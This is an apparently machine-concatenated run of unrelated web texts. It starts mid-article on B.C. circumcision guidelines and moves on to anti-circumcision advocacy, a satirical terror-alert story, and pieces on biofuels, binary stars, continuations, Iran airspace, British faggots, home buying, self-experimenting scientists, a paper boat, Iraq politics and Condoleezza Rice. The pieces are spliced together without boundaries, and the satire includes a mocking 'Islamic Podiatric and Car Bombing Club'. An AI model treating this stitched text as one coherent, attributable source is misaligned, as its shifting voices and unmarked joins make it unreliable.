" No physician wants to be in practice and sued 10 years later for a procedure they did that was acceptable 10 years earlier . "
The blood - loss death of one - month - old Ryleigh McWillis two years ago after a circumcision at Penticton Regional Hospital raised a public outcry that led to the new guidelines , said Dr. Peter Seland , in charge of ethics for the college .
" There are no medical benefits when you balance the risks and benefits , " Seland said .
" People can make their own ethical decisions but they need to be informed . "
Provincial health officer Dr. Perry Kendall , speaking as an individual , drew a parallel between routine male circumcision and the much reviled practice of female circumcision in sub-Saharan Africa .
" You 're mutilating the genitalia , " he said .

B.C. college tightens its circumcision recommendation
By Lynn Haley , Medical Post , July 6 , 2004
VANCOUVER
Opponents of circumcision are applauding a new policy statement issued by the B.C. College of Physicians and Surgeons .
Dr. Peter Seland , deputy registrar ( ethics ) of the college , said the new statement is intended to help physicians navigate this minefield .
The statement advises that circumcision may be carried out only when it is in the best interests of the child .
It also says the procedure has no medical or prophylactic values and that doctors must advise parents of the associated risks including urinary tract infection , urinary retention , meatal stenosis and hemorrhage ( as was seen in a recent B.C. case that resulted in the death of a one - month - old boy ) .
Doctors are under no obligation to circumcise the child at the request of parents , the statement says .
" There is a never - ending stream of concerns that we get at the college around this issue , " said Dr. Seland .
" There is nothing in terms of the intensity of the debate that separates this from abortion .
People have very strong views about this issue .
" But when you cut through it all and examine it , it appears there is still a small portion of our society that might have been making the decision without being fully informed as to its implications , making decisions on such flimsy grounds as ‘ We want him to be like daddy . '
So we really wanted a tool for physicians to look at , and think about where we 're at , not just from a medical point of view . "
The trump of course , Dr. Seland said , is the cultural and religious aspects of circumcision , unlike female genital mutilation which , Dr. Seland says , is off - the - wall .
" Since male circumcision is neutral medically , you can't really say that medical indications trump religious preferences , " he noted .
" The flames were fanned when that baby died in Penticton .
It spurred us on to come out with this guideline . "
Such a procedure at birth could conceivably have a traumatic effect in later years , said Dr. Seland .
" There is ( also ) the issue that a decision has been made by the parents to do this on weak grounds , and the result is the adult male is denied erogenous pleasure , though I do n't know whether anybody will ever know that for certain , " he said .
Dennis Harrison , a spokesman for the Canadian group Association for Genital Integrity , welcomes the changes in policy from the college .
He says the focus on bioethics and human rights will help provide physicians with the tools they need to guide parents around the complex issues surrounding the procedure .
" This is very difficult for many parents , because there is often the conflict between the parents ' rights and the child 's right , " said Harrison .
" But in a country like Canada , the vast majority of circumcisions are not done for religious reasons .
It 's true that parents are responsible for making decisions on behalf of their children , but there is no surgical operation a parent can consent to without medical need , and circumcision is not medically necessary .
We applaud the college 's guidelines , but we think they could have gone further . "
Human rights treaties
United Nations Convention on the Rights of the Child 1989
Article 14
Article 14 ( 1 ) gives the child freedom of thought , conscience and religion .
This means that he or she is entitled to choose his or her own religion , and that parents do not have the right to impose their own religion , or the rites and customs of that religion , on their children .
Article 14 ( 1 ) .
States Parties shall respect the right of the child to freedom of thought , conscience and religion .
Article 19
Article 19 ( 1 ) protects children violence , injury and abuse : violence or injury occurring in a doctor 's surgery is not excluded .
Article 19 ( 1 ) .
States Parties shall take all appropriate legislative , administrative , social and educational measures to protect the child from all forms of physical or mental violence , injury or abuse , neglect or negligent treatment , maltreatment or exploitation , including sexual abuse , while in the care of parent ( s ) , legal guardian (s ) or any other person who has the care of the child .
Article 24
Article 24 ( 3 ) requires signatories to work towards abolishing " traditional practices " harmful to children 's well being .
These are not spelt out explicitly , but the reference is unmistakably to practices like circumcision , which could not be named out of deference to the many member countries of the UN which practise male or female circumcision or both .
This article requires the Australian government to take active steps to discourage and eradicate male and female circumcision ; it has taken effective action against female circumcision , but nothing so far towards abolishing male circumcision .
Article 24 ( 3 ) .
States Parties shall take all effective and appropriate measures with a view to abolishing traditional practices prejudicial to the health of children .
Article 37
Article 37 ( a ) protects children from cruel or degrading treatment : what could be more cruel or humiliating for a nine or a six - year old boy than to have the most interesting part of his penis cut off ?
Article 37 .
States Parties shall ensure that : ( a) No child shall be subjected to torture or other cruel , inhuman or degrading treatment or punishment .
The full text of the UN Convention on the Rights of the Child
Australian Medical Association Code of Ethics
The new Code of Ethics recently adopted by the Australian Medical Association has a number of provisions which are relevant to circumcision of minors .
The DOCTOR and the PATIENT
1.1 Patient Care
Consider first the well - being of your patient .
Treat your patient with compassion and respect .
Approach health care as a collaboration between doctor and patient .
2. PROFESSIONAL INDEPENDENCE
(d) Recognise your right to refuse to carry out services which you consider to be professionally unethical , against your moral convictions , imposed on you for either administrative reasons or for financial gain or which you consider are not in the best interest of the patient .
4 . The DOCTOR and SOCIETY
(g) Regardless of society 's attitudes , ensure that you do not countenance , condone or participate in the practice of torture or other forms of cruel , inhuman , or degrading procedures , whatever the offence of which the victim of such procedures is suspected , accused or convicted .
The full Code of Ethics is available here .
Note that these principles refer to the relationship between the doctor and the patient , and that the AMA recognises that the primary responsibility of the doctor is to the patient .
The patient is the person receiving medical treatment , not the person or organisation paying for it .
There is nothing in these rules which would justify a doctor amputating a normal foreskin from an infant or child merely because another person with the money to pay for the operation asked to have it done .

Weaknesses of international human rights treaties
Human rights relate to individuals , not to collectives or societies .
That is to say , they emerged in the struggle for the autonomy of the individual against traditional religious , monarchical and patriarchal authority , and they were an assertion of the right of each individual to think for him and herself and to enjoy the freedom to live without the close community supervision that characterised traditional ( pre-modern ) society .
Despite this , in recent times human rights have increasingly been interpreted as pertaining to cultures and ethnic / religious groups , which have claimed that they have a " human right " to discipline their members and enforce traditional practices .
This is to turn the concept of human rights inside out and to deprive it of any capacity to assist individuals .
Nowhere is this tendency more evident than in international organisations such as the United Nations , which in its interpretation of international human rights treaties has consistently placed the interests of its member states over the interests of their citizens as individuals .
And nowhere is this abandonment of the spirit of the Universal Declaration of Human Rights and other treaties more blatant than in its double standards on male and female circumcision : ignoring , condoning or encouraging the former while mounting expensive campaigns against the latter .
In two hard - hitting essays posted here the Palestinian - Swiss legal scholar , Dr Sami Aldeeb , examines the failure of the United nations to live up to its own principles .
In the first essay he argues that if physical integrity is a human right , it must apply to boys as much as to girls , and hence that if girls are entitled to protection from circumcision , boys are also so entitled .
In the second essay he analyses the reasons for the double standards so evident at the United Nations and other international agencies , such as the World Health Organisation , thus providing an essential background on the cultural basis for its endorsement of male circumcision as a tactic against AIDS in African countries .

Sami Aldeeb 's blog ( in French )
Religiously motivated circumcision
When people refer to " circumcision for religious reasons " they are generally referring to the practices of Judaism and Islam .
Circumcision is traditionally practised by Jewish parents when their baby boys are eight days old , and by Muslim parents when their boys are aged between six and ten years - though there is wide variation here , and these days many Muslims have it done much earlier , following the United States model .
This is particularly the case in semi- westernised Muslim countries such as Turkey and Malaysia , where it is increasingly done by doctors in a hospital .
A search for " Sunnet " or " Khitan " on Youtube or Google Images will bring up many disturbing images .
Islamic law and custom states that girls should also be circumcised , but in practice this is less frequent , and even where it is done the operation often consists of no more than a semi-symbolic scratch on the vulva or other minor intervention .
In many western countries the circumcision of girls has been banned by law .
It is quite wrong , however , to allow cultural or ethnic stereotyping to lead us into the assumption that all Jewish people , or all Muslim people , or all Somalis are in favour of circumcision .
In all these communities there is a wide spectrum of views on the issue , ranging from fanatical commitment to determined opposition .
In the United States Jewish people are particularly prominent in the various anti-circumcision groups , and critics of circumcision have recently emerged in several Muslim communities as well .
A group of Arabs opposed to circumcision have established a Facebook profile .
What they have in common is the recognition is that human rights apply to babies and children as well as to adults , and to boys as much as to girls .
As Soraya Mire , the Somali filmmaker and activist against forced female genital mutilation , remarked in June 2009 :
" The same universal human right to an intact body that I have fought for on behalf of women and girls must apply to boys as well , especially those too young to make an informed decision about the integrity of their bodies .
How can it be wrong to surgically alter the genitals of a baby girl without her consent but okay to surgically alter the genitals of a baby boy ? "
Circumcision among the Jewish people
For information on Jewish circumcision , see the Circumcision Resource Centre , a US site maintained mainly by Jewish men and women who are opposed to circumcision .
Sites established by Jewish men and women opposed to circumcision :
Beyond the Bris ( new USA site )
Jews Against Circumcision and Kahal .
They write : " We are educated and enlightened Jews who realize that the barbaric , primitive , torturous , and mutilating practice of circumcision has no place in modern Judaism .
Rabbi Moses Maimonides himself acknowledged that circumcision is only done to desensitize the penis and curb masturbation .
In ancient Judaism , you could be murdered for disobeying your husband or parents , blasphemy , homosexuality and other so - called crimes that we now realize are not crimes , but freedoms of expression .
Jews are some of the smartest people in the world .
We are 1/3rd of 1 % of the population , yet we hold 33 % of Nobel prizes .
We are smart enough to understand that mutilating our little boys genitals is not an acceptable practice in modern times . "
Jewish voices against circumcision getting stronger ( on this site ) .
Brit Shalom is a non-cutting naming ceremony for newborn Jewish boys .
It may be performed by a Rabbi or other experienced lay leader .
If desired , providers can aid parents in devising their own ceremony .
This ceremony replaces Brit Milah ( ritual circumcision ) .
It has also been termed Alternative Brit ( or Bris ) , Brit b'li Milah ( Covenant without cutting ) and Brit Chayim ( Covenant of Life ) .

Iranian human rights activist criticises circumcision
As the demand for democracy and individual rights spreads from the developed world to the Middle East and Asia , more people are taking up the cry that bodily integrity - an entitlement implied in the Universal Declaration of Human Rights - applies to all parts of the body .
Progressive Jewish people , especially in the United States , have been abandoning circumcision for many years , but until recently few people from a Muslim background dared to question the practice .
That silence has now been broken by the Iranian human rights activist , Jahanshah Rashidian , in his recent essay , Circumcision or genital mutilation .
Christianity
Christianity demarcated itself from its Jewish parent by rejecting and then prohibiting circumcision .
If it is true that a pious Jewish parent must circumcise his sons , it is equally true that a pious Christian must not .
The Christian Church has repeatedly condemned and sometimes banned circumcision : www.cirp.org/library/cultural/

London - British public safety officials today increased the national alert level to " Quite Elevated Indeed " -- the highest category possible -- and appealed to UK citizens to " keep a sharp lookout for diverse people engaged in activities . "
" We ask the public to report any behaviours by various people that may or may not be of a suspicious nature , " said Lt. Clive Jameson of the Metropolitan Police Service .
" We further ask the public to be especially vigilant for activities of broad stratas of people who may be from countries of some sort , especially those within the eastern and / or western hemisphere . "
The elevated alert levels come on the heels of a week when London and Glasgow narrowly escaped potential events that intelligence experts say may have been related to diverse groups of people doing things .
Initially police had specifically asked the public for information relating to doctors driving automobiles , but that initial warning brought angry denunciations from the British Medical Association and the UK Automobile Association .
" This directive unfairly singles out and targets British medical professionals , a great many of whom are loyal and patriotic citizens , " complained Dr. Hamish Meldrum , chairman of the BMA .
" The fact that some of the people involved in the recent unfortunate events may have been doctors is totally coincidental , just as if they had been accountants , plumbers , or random members of a deranged apocalyptic religious cult . "
Sir Trevor Chinn , Chairman of the UKAA , warned that the earlier directive would " spark a backlash against the British motoring community and promote a climate of fear and carophobia . "
On Tuesday , new British Prime Minister Gordon Brown met with representatives of the medical and car communities and announced that the government would henceforth prohibit occupational and transportational profiling by public officials .
Brown said further government communications would prohibit the use of certain prejudicial words like " doctor , " " Vauxhall , " " podiatrist , " " propane , " " Asia , " " drive , " " ticking noises , " " panic , " and " the . "
Brown also announced the formation of a blue ribbon multicultural community advisory board chaired by Dr. Mohammed Ibn - Yasin of the UK Islamic Podiatric and Car Bombing Club .
In the latest warning , Metropolitan Police said Scotland Yard had set up special telephone and internet hotlines for citizens to report tips of possible activities by other people , including " excessive use of cell phones and computers . "
" An informed and vigilant London is our eyes and ears , and our best hope for thwarting these diverse groups of people from various countries and backgrounds and occupations who are engaged in , or potentially planning activities of some sort , " said Jameson .
But the spokesman also said public involvement should stop there .
" We are asking for vigilance , not vigilantes , " said Jameson .
" After reporting alleged activities , the public should wait for the professionals , who have the necessary multicultural training and snappy reflective uniforms to prevent and / or clean up afterwards . "
" After diversity awareness , our paramount goal is public safety , " added Jameson .
" As we saw recently in Glasgow , if a well - meaning but untrained citizen steps in and tries to stop a diverse person of activity by kicking him or her in the testicles , he or she could suffer a painful tendon injury . "
Nigel Brunton , a spokesman for the British Society of Diverse People Doing Various
Things , said his organization was " cooperating fully " with police , but said he felt it unfair that it was being singled out .
" In every group there 's bound to be a few bad apples , " said Brunton .
" Or some sort of pomaceous fruit of some kind . "

The latest scientific research reveals that biofuels used in vehicles may be more harmful for human health than the petrol used today .
By 2020 , 10 % of all transport means should run on biofuels as agreed by the EU .
The researchers invented a special computer model to determine air quality in 2020 .
The model showed that ozone level in some regions would grow if bioethanol was used for all cars .
It would cause more ailments and asthma attacks .
There naturally appears the question – why to use biofuels if it is not beneficial for the environment and human health in particular ?
As showed by the study , the smog level increase meant 200 deaths more every year in the US , with only Los Angeles at risk of 120 deaths .
Even if to take into account that ozone increase in some US regions would be partially compensated by its decrease in other regions , in general there would be over 700 extra complaints to accident and emergency and almost 1000 extra hospitalizations of people suffering from asthma and other respiratory ailments .
The scientists determined that the use of ethanol reduces levels of two carcinogens found in atmosphere , while increases levels of other carcinogens .
Thus , cancers caused by atmospheric carcinogens would remain at the same level as caused by pollution in case of petrol fumes .
Biofuels such as ethanol and diesel are mainly produced from corn , sugarcane and rapeseed .
They provide a way of diminishing greenhouse gas emissions if compared to conventional fuels .
Despite the fact that biofuels produce carbon dioxide , the plants growing leads to absorption of a similar amount of the gas from the atmosphere .
According to a government report , the use of biofuels would result in emissions ' reducing by 50 - 60 % compared to petrol fuels .
However , it would not be possible to have all vehicles on ethanol fuel as too much land would be required for growing the plants .
At the moment some scientists also consider the opportunity of converting all vehicles to battery - electric .
The necessary amount of electricity would be supplied by wind energy .
The use of battery - electric cars would keep the mankind away from 10,000 annual air pollution deaths as well as 98 % of carbon emissions produced by vehicles .
If we tried to make the conclusion , there would be no clear answers so far whether the use of biofuels will be somehow better for people 's health .
The controversial issue is still to be thoroughly studies by scientists .

After discussing his future plans with his Uncle Owen , Luke Skywalker leaves the Lars Homestead and heads towards the vista to watch the twin suns of Tatooine set while he reflects upon his destiny .

Astronomers might not have to search a galaxy far , far away after all to find a world with double sunsets like Luke Skywalker 's home planet Tatooine .
A new study suggests the universe is filled with them .
Astronomers using NASA 's Spitzer Space Telescope have found that twin - star systems are just as likely to be surrounded by dusty debris disks as ones with only a single star .
Debris disks are made up of asteroid - sized rock chunks and other material that could be leftovers of planets that have formed in the system .
The majority of stars like our Sun have at least one stellar companion .
Astronomers have theorized that planets could form with little trouble in two - star systems , called binaries , despite the more complex gravitational tugging .
The new study provides strong observational evidence to support that idea .
" There appears to be no bias against having planetary system formation in binary systems , " said study leader David Trilling of the University of Arizona .
" There could be countless planets out there with two or more suns . "
A planetary nursery
Trilling and his team looked for disks in 69 binary systems between 50 and 200 light - years away from Earth .
All the stars are more massive and younger than our middle - aged Sun .
The researchers found that about 40 percent of the binary systems they looked at had disks .
This frequency is a bit higher than that for a comparable sample of single stars and suggests planets are at least as common around binary stars as they are around single stars .
Deepak Rhagavan , an astronomer at Georgia State University who was not involved in the study , says the new findings are exciting because they are the first evidence of a planetary nursery in a multiple star system .
" Until now , we knew planets existed [ in multiple star systems ] , but I think this is the first time that we 've gotten a comprehensive study that looks at the debris disk where planets are born , " Rhagavan said .
Last year , Rhagavan 's team reported that many star systems known to harbor planets actually contained two , and in some cases , even three , stars .
Alan Boss , a planet formation theorist at Carnegie Institution of Washington , says the finding is encouraging news for planet hunters .
" It 's pretty reassuring , " said Boss , who also was not involved in the study .
" This really goes in the direction of making planets more frequent than they would be otherwise . "
Tight binaries
Surprisingly , most of the debris disks found in the new survey were around so - called tight binary systems , where the stars are separated by 500 AU or less .
One AU is equal to the distance between the Earth and the Sun .
Scientists know of about 50 planets that have two Suns , but all of them belong to " wide " binary systems , where the stars are separated by about 1,000 AU .
" The fact that they 've found some positive evidence of planet - forming disks being around close binaries is really a new step , " Boss said .
Some scientists had previously argued that planet formation would be stifled in tight binary systems because of the large gravitational interactions between the stars .
" The idea was that the extra star would stir up the stuff in the planet forming disk so much that you would never form a planet , " Trilling told SPACE.com .
Trilling said his team 's results might mean that planet formation favors tight binaries over single stars .
However , it could also be that tight binaries are just dustier , and thus easier to spot .
Further observations will be required to determine which of these explanations is correct .
A human gazing at a double sunset on a world with two Suns like Skywalker 's Tatooine might not find the scene so alien after all , Trilling said .
" It would be kind of like what you see on Earth , but with an extra Sun following in the sky , " he said .
" Maybe it 's a little hotter during the day . "
Delimited continuations are more expressive than traditional abortive continuations and they apparently require a framework beyond traditional continuation - passing style ( CPS ) .
We show that this is not the case : standard CPS is sufficient to explain the common control operators for delimited continuations .
We demonstrate this fact and present an implementation as a Scheme library .
We then investigate a typed account of delimited continuations that makes explicit where control effects can occur .
This results in a monadic framework for typed and encapsulated delimited continuations which we design and implement as a Haskell library .

The U.S. might be trying to get the Iranians to “ paint ” aircraft with their air defense systems .
The U.S. would use this intelligence for final target selection for the initial phase of the attack .
Air defense and communications systems will be hit first .
Via : People ’s Daily :
Two U.S. airplanes have violated Iran ’s airspace in the southwestern province of Khuzestan , Iran ’s state television Sunday quoted a local military commander as saying on its website .
The airplanes on Saturday trespassed Iranian airspace from the northwest of Abadan , Khuzestan province , and disappeared from its southwest , said Colonel Aqili , commander of the Islamic Revolution Guards Corps ( IRGC ) in Abadan .
“ The planes cast out white smoke trails , attracting the local people ’s attention , ” he was quoted as saying , but without giving the types of the two U.S. airplanes or their duration of the alleged violation .

A West Midlands family is playing a central role in the quest to raise the profile of a forgotten British dish - faggots .
The Doody family from Wolverhampton has been crowned The Faggot Family in a national competition , and to kick off their reign they will launch National Faggot Week .
The family will be touring the country extolling the virtues of the dish , which is best - known for its links with the Black Country .
The Doody family were chosen to front the campaign after impressing judges at the Savoy Hotel in London in November .
Faggot facts Faggots were called " savoury ducks " in the Middle Ages
Faggots were named after the Latin word for bundle
Faggots were originally made with pig's liver and offal
Faggots are now made from pork liver and pork
Fans have published the Good Faggot Guide
They displayed their fanaticism for the delicacy during quizzes , role - plays and mock commercials .
" The nation knows that the Cornish pasty , Yorkshire pudding , haggis and fish and chips are great British dishes , but all too often the faggot is left off that list , " said Janet Doody .
Her husband Fred added : " It 's unfair because faggots were a British delicacy long before any of the others .
" The great British faggot is full of flavour and a great belly warmer at this time of year . "
The family , including Lewis , 13 , and Grace , 7 , eat faggots twice a week , with mashed potato and mushy peas , and will be launching the awareness campaign on Tuesday at Liverpool University , followed by visits this week to Nottingham , Leeds , Sheffield and Birmingham .
The competition was organised by faggot producer Mr Brain 's Faggots .
The American dream .
Two children , a dog , and a home you own .
What is more wholesome than the real estate agent who helps you achieve that dream ?
Real estate sales is about EMOTION .
It ’s a simple fact .
This is the reason that staged homes sell so much more effectively than unstaged homes .
It ’s the reason why curb appeal is so important .
Yes , most agents are taught a thing or two about contracts , but having been in the field , more agents are concerned about “ getting that sale ” .
Of course , because it means they get closer to getting paid .
Now I do n’t mean to bag on agents .
I respect a few of them very highly , it ’s just that I ’ve seen and worked with more than my fair share in many capacities .
Very few agents I know would tell a buyer in today ’s market who is on the verge of affording a home , to wait until the market slows down further .
These are the agents I respect , the ones that know return customers make their money , and not the quick sale or purchase .
Close your eyes and think about the recent headlines you ’ve heard .
Stories of foreclosures , stories of people being blindsided by emotion , and people buying houses they could qualify for , but homes they could n’t afford .
Now watch this video .
This could have been you .
This was many Americans .
Currently mulling over whether you should keep renting or make that leap and purchase that home .
Your apartment is getting small after all and you deserve a bigger house !
The bank even said you qualify !
Agents and Lenders may be to blame , but the root of the problem lies within our ability to easily be sold into something that is n’t financially prudent at the moment .
So Why Does That Video Scare You To Death ?
Because its message WORKS .
You empathize with that couple because you have children , or your house is too small , or you want that garage .
You realize that if it ’s that easy , YOU CAN DO IT .
This video scares me because hundreds if not thousands of people have seen it , and many of them probably went through with a transaction that is now threatening to destroy their financial world entirely .
This is definitely the coolest looking apartment complexes that we ’ve come across , but where are the stairs ?
( Thanks , Jake )

In 2003 , impatient for the approval of clinical trials , virologist Pradeep Seth injected himself with an experimental HIV vaccine .
He was not the first , and certainly wo n't be the last , scientist to use himself as a human guinea pig .
Obviously not everybody 's research lends itself to such dramatic experimentation , but we all make sacrifices in our own way .
Here are 7 scientists whose self - experimentation put their health at risk for better understanding of our own . -
In the days before controlled clinical trials , many medical researchers used themselves as guinea pigs .
Born in Scotland i n 1728 , John Hunter was a brilliant surgeon .
He wrote two books on teeth , and is credited with naming the cuspids , bicuspids , incisors and molars .
Upon damaging his Achilles tendon , he used dogs to show how bones and tendons mend .
But his interests were n't limited to teeth and bones , and his wild experimentation was n't limited to cutting the tendons of dogs to analyze the healing process .
In writing his Treatise on Venereal Disease , Hunter inoculated himself with gonorrhea to study the course of the disease and response to treatments with mercury and cauterization .
His studies added greatly to the understanding of the role of inflammation in healing .
Unfortunately , sterile technique was n't the practice of the day and the needle used to infect himself was also contaminated with syphilis .
When he contracted both diseases , this was taken as proof that there was , in fact , only one venereal disease - an error that would n't be corrected for another half - century . -
While John Hunter was torturing his own genitals with STDs , his contemporary Lazzaro Spallanzani was playing with those of animals .
His work described mammalian reproduction , and he was the first to perform an artificial insemination , using a dog as his subject .
He also performed experiments testing ideas of spontaneous generation .
His great self - experiment was a study of the digestive process , , published in the 1780s .
These experiments were done using his own gastric acids either collected by induced vomiting , or , more dramatically by swallowing linen containers containing material to be digested .
He would let them pass and find the bag intact , but the contents gone .
To show it was a chemical and not mechanical action , he repeated these experiments with perforated metal or wooden tubes , allowing the food to be exposed to the stomach contents , but unable to be ground by mechanical action .
He expanded the knowledge of digestion , making the disctintion between mechanical and chemical digestion and postulated the involvement of acid in the gastric juice . -
If Spallanzani taught us about digestion , Barry Marshall taught us about indigestion .
As a physician interested in gastritis he , along with Robin Warren , culturedand hypothesized a bacterial cause for gastritis and peptic ulcer , going against the commonly held belief that spicy or acidic foods and stress were responsible for those ailments ( as well as the belief that no bacteria could survive in stomach acid ) .
In the face of overwhelming opposition to his ideas and lacking an animal model in which to test them , a healthy Marshall drank a pyloric culture and fell ill , eventually presenting with gastritis as predicted .
By his own admission , Marshall was surprised by the severity of infection , never expecting to become as ill as he did .
This experiment both demonstrated a bacterial cause for gastritis and peptic ulcers and laid the groundwork for a simple and cost effective treatment - antibiotics .
Barry Marshall won the Nobel prize for his work in 2005 .- Consumption of a pathogenic bacteria is a common theme among self - experimenters and 100 years before Barry Marshall gave himself an ulcer , Max Joeseph von Pettenkofer was performing similar experiments .
Sometimes considered the father of epidemiology , von Pettenkofer was a strong proponent for hygeine for good health .
In an attempt to prove that the bacteria alone would not cause cholera , but rather dependent on 7 factors ( including diet and hygeine ) , he drank a cholera sample isolated from the excrement of a dying patient .
Though he had mild symptoms , " light diarrhea with an enormous proliferation of the bacilli in the stools " , he did not have a severe reaction and considered himself vindicated . -
Not every self - inoculation has such mild consequences .
Jesse Lazear was a physician working in Cuba with the US Army Yellow Fever Commission .
Faced with evidence of an intermediate host in the spread of yellow fever and familiar with mosquitoes and the transmission of malaria , Lazear wanted to get to the real vector .
He began infecting mosquitoes in August 1900 , and allowed himself to be bitten , eventually contracting the disease and dying .
While he lost his life in this experiment , " his work contributed towards one of the greatest discoveries of the century , the results of which will be of invaluable benefit to mankind . "
( Dr. L.O. Howard ) Currently Yellow Fever is mostly restricted to sub-Saharan Africa and developing countries in South America , and a vaccine against this infection exists . -
Some researchers go to even greater lengths to make themselves ill than drinking a culture or being infected by mosquito .
This was the case for William Harrington , a haemotologist in St. Louis .
Trying to find a basis for idiopathic thromgocytopenic purpura ( ITP ) , a disease resulting in a low platelet count which causes bruising , and bleeding issues , Harrington infused himself with plasma from a patient with ITP and rapidly developed transient thrombocytopenia , with a severe risk of hemmorhaging .
His experiment demonstrated that there was a plasma factor responsible for the condition .
Harrington 's discovery of an autoimmune component has lead to a number of therapies for the disease . -
If blood transfusions and toxic cocktails are n't risky enough , then what about self - surgery ?
Werner Forssmann showed that the way to a man 's heart is through the antecubital vein .
At the time , the belief was that any entry into the heart would be fatal , but Forssmann inserted a catheter into his arm and threaded it 65 cm into his heart .
He then walked to the radiology department , to have it x-rayed to prove his success .
Over his lifetime , he would do this several more times , even using the method to inject solutions into the heart .
( Forssmann 's goal was to use this technique to directly administer drugs )
Though he was fired from the hospital for his initial experiments , Forssman was recognized for his work , sharing the 1956 Nobel Prize for Medicine or Physiology Obviously there are many others who have risked life and limb through self - experimentation in pursuit of a breakthrough .
Right or wrong , some of them have certainly lead to advancements in medical or other fields .
How far would you go forscience ?

Artist Frank
Boelter set sails in his lifesize paper boat as he leaves a shipyard in Lauenburg , Germany .
He constructed the 9 - metre vessel from ' Tetrapack ' and fearlessly sailed it up the Elbe , despite the fact the light material is more commonly used for packaging milk .
Scroll down for more ...
The 37 - year - old artist came up with the idea one breakfast time , while he was sitting at his kitchen table fiddling with an empty milk carton , which he cut up and made into a scaled - down model .
The £ 110 boat is 30 feet long , weighs 55 pounds , uses a 170 - square - metre piece of Tetrapack paper , and took only two hours to construct .
Scroll down for more ...
Boelter said it will survive forty days before it disintegrates into a wet , sinking mass .
It is part of the artist 's exhibition named ' Bis ans Ende der Welt ' ( Until the end of the world ) .
It 's aqua - origami , all right , but is it art ?
You can't really say that Republicans have n't been plotting a strategy on Iraq .
Not for removal of the troops , for avoidance of blame .
There had already been plenty of dress rehearsals for an updated Dolchstosslegende , one in which every theme around " we would have won , too , if it had n't been for those cowardly Dems " could be recycled , expanded , and used as part of the umbrage to drive the next war .
But with yesterday 's Washington Post editorial , the Republican exit strategy from blame went into a new phase of rapid withdrawal .
What the Republicans -- and the Post -- are trying to sell now is the idea that , despite having called Democrats every imaginable name for even considering the idea , having used every possible procedural dodge , and having continued to toss a wrench into the works of every sign of progress , Republicans were just about to make a deal .
Suddenly they all agree that things are going badly ( what ?
even in the lovely Indiana - style markets ? ) and that they do n't back Bush ( unless , of course , he asks for anything -- anything at all ) .
They were really about to sign on .
Sen .
Johnny Isakson expected to be bored by the war speeches on the Senate floor Tuesday night ; instead , the Georgia Republican was riveted by the passionate debate and spent hours soaking it in .
But Sen. Olympia J. Snowe of Maine , a recent GOP convert to the antiwar cause , fumed that her new Democratic allies had forced a showdown just as a bipartisan consensus appeared to be emerging .
In other words , if Democrats had n't pushed so hard for getting the troops out , Republicans would have gotten the troops out , despite passing on every previous opportunity .
A paragraph later , it 's revealed that while Republicans " blocked a simple - majority vote , " Harry Reid did n't just shelve a defense spending bill , he " stood at the front of the chamber and shut down the war debate , probably until September . "
Who knew Reid had such power ?
The Post 's coverage continues into profiles of four lawmakers .
( It 's interesting that Johnny Isakson is the the Loyal Republican while Jan Schakowsky is the Antiwar Liberal .
No slant to those labels . )
Giving plenty of occasion for those who have carried Bush 's water to claim that they 've had second thoughts .
Oddly enough , the Post writers never point out the disconnect between calling last week 's debate " premature , " complaining about Reid 's actions , and then claiming that nothing can be done till we get Patraeus ' report in September .
And while the Democratic actions were " partsian , " Republican actions in blocking a vote get a single mention .
Apparently you can be frustrated that someone wo n't let you do something you did n't intend to do in the first place .
What will happen once we get to September ?
Let 's revisit that Wikipedia article on Dolchstosslegende .
After the last German offensive on the western front failed in 1918 , the German war effort was doomed .
In response , OHL arranged for a rapid change to a civilian government .
General Ludendorff , Germany 's Chief of Staff , said : " I have asked His Excellency to now bring those circles to power which we have to thank for coming so far .
We will therefore now bring those gentlemen into the ministries .
They can now make the peace which has to be made .
They can eat the broth which they have prepared for us ! "
...
As the Kaiser had been forced to abdicate and the military relinquished executive power , it was the temporary , " civilian government " which sued for peace - the signature on the document was of the Catholic Centrist Matthias Erzberger , a civilian , who was later killed for his alleged treason .
This led to the signing of the Treaty of Versailles .
Even though they publicly despised the treaty , it was most convenient for the generals — there were no war crime tribunals , they were celebrated as undefeated heroes , and they could covertly prepare for removing the republic which they had helped to create .
All the credit , none of the blame .
I wonder how many times that memo will be handed out at Fox ?

Meteors burn bright — and fall to earth
IT IS hard to believe now , but as recently as the spring of 2005 Condoleezza Rice was being touted for the presidency of the United States .
She had just been appointed secretary of state in succession to Colin Powell at the start of George Bush 's second term , and a world tour was going well .
In Paris , the French ambassador to America remarked , “ everyone was determined to fall in love ” with her .
She wowed the crowds in Wiesbaden by arriving in knee - high leather boots .
Her spokesman went so far as to fuel speculation about a White House bid by planting a question with a helpful journalist .
Ms Rice 's star , which rose so fast , has plunged back into obscurity , and the reason is easy for anyone reading this pair of biographies to see .
As secretary of state , she has mostly failed in grappling with a web of problems that she herself helped to create when she was turning out to be a notably weak national security adviser .
Mr Powell presciently said of Iraq , “ If you break it , you own it . ”
That might serve as an epitaph for Ms Rice 's career at the top of American policymaking .
Of the two books , Marcus Mabry 's is the more comprehensive , a full - scale biography covering Ms Rice 's life from childhood in segregated and violent Birmingham , Alabama , to the present day .
He takes as his book 's title a saying in the Rice family that , as a black American ( let alone a female one ) , you needed to be “ twice as good ” to succeed .
Yet much of what he recounts belies this .
Ms Rice grew up in what may then have been America 's most racially charged city ; she herself heard and felt the explosion when white supremacists blew up the Sixteenth Street Baptist Church there in 1963 .
Her family , however , moved to far more tolerant Colorado when she was 12 , where her father quickly rose to a senior administrative position at the University of Denver .
Ms Rice 's early career — first to a place at that same university , then to Stanford , then to the National Security Council in Washington , DC , then back to Stanford to become provost at the age of only 38 — shows doors opening readily enough .
Mr Mabry produces nothing to suggest she needed to be anything like twice as good .
Her biggest break came in 2000 , when Candidate George Bush chose her to coach him in foreign policy , of which he admitted to knowing almost nothing .
Mr Mabry makes much of the instant rapport between these two very different types , the cautious blue - stocking and the reformed hell - raiser , though he cannot entirely explain it .
Ms Rice has described the candidate as having “ an incredibly inquisitive mind ” .
Mr Bush was later to describe Ms Rice as “ the most powerful woman in the history of the world ” .
Which makes it mysterious how she came to serve him so badly .
The national security adviser is meant to co-ordinate foreign - policy making .
Yet in that job Ms Rice seemed entirely unable to resolve the many disputes between Donald Rumsfeld at Defence and Mr Powell at State .
Even without that failure , it would have been impossible not to allot her much of the blame for the mistakes in Iraq .
If she realised America was sending too few troops and had rejected all post - war planning , she should have told the president : she had his ear , and access .
If she did not realise , she should have done .
Mr Mabry dwells at length on Ms Rice 's inability to admit to error .
This quality of impenitence also extends to her refusal to accept any blame for failing to anticipate the attacks of September 11th 2001 .
